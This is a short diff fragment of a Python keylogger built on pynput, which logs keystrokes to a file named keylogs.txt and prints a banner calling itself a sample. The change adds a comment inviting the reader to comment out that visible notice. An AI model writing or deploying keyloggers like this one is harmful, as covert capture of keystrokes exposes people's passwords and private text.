@@ -3,7 +3,7 @@ from pynput.keyboard import Key, Listener
 import logging
 
 print("WHEN DONE CLOSE THIS WINDOW\nTHIS IS A SAMPLE OF A KEYLOGGER MADE FROM PYTHON ")
-
+# comment out the above line if you want (:
 log_dir = ""
 
 logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
